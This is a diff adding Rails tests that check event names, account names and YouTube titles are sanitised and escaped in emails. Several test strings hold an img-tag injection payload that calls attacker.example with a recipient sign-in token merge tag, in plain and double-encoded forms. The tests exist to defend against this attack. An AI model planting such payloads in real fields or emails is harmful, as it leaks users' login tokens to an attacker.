@@ -180,8 +180,54 @@ class EventsTest < ActiveSupport::TestCase
     assert_equal 'Org', @organisation.name
 
     @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
-    assert_equal 'Workshop <img src="https://attacker.example/">', @event.name
     refute_includes @event.name, '%recipient'
+  end
+
+  test 'names never keep angle brackets however they were encoded' do
+    # Double-encoded so a single decode pass would otherwise leave live markup in the name
+    create_event(name: 'Workshop &lt;img src="https://attacker.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;', prices: [0])
+    @account.update!(name: 'Ada &lt;b&gt;Lovelace&lt;/b&gt;')
+
+    refute_match(/[<>]/, @event.name)
+    refute_match(/[<>]/, @account.name)
+    assert_equal 'Ada', @account.firstname
+  end
+
+  test 'names are escaped in emails' do
+    create_event(prices: [0])
+    # Bypass sanitisation: output escaping must hold even for a stored name containing live markup
+    @event.set(name: 'Workshop <img src="https://attacker.example/x?t=&#37;recipient.token&#37;">')
+
+    html = EmailHelper.html(:waitlist_tickets_available, event: @event)
+
+    refute_match(/<img[^>]*attacker\.example/, html)
+    assert_includes html, 'Workshop &lt;img'
+    assert_equal html.scan('sign_in_token=%recipient.token%').size, html.scan('%recipient.token%').size
+  end
+
+  test 'youtube titles are escaped in emails' do
+    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
+    video = Struct.new(:title).new('<img src="https://attacker.example/x?t=%recipient.token%"> & more')
+    Yt::Video.stub(:new, video) do
+      html = EmailHelper.replace_youtube_oembeds(@event.extra_info_for_ticket_email)
+
+      refute_match(/<img[^>]*attacker\.example/, html)
+      refute_includes html, '%recipient.token%'
+      assert_includes html, '&lt;img'
+      assert_includes html, '&amp; more'
+    end
+  end
+
+  test 'intentional html still renders in emails' do
+    create_organisation(show_details_table_in_ticket_emails: true)
+    create_event(name: 'Tom & Jerry', prices: [0], extra_info_for_ticket_email: '<p>See <strong>you</strong> there</p>')
+    order = @event.orders.new(account: @account)
+    tickets_table = EmailHelper.render(:_tickets_table, event: @event, account: @account)
+    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: tickets_table, header_image_url: nil)
+
+    assert_includes html, 'Tom &amp; Jerry'
+    assert_includes html, '<strong>you</strong>'
+    assert_includes html, '<table class="event-details"'
   end
 
   test 'nested ticket type cannot reference another event ticket group' do
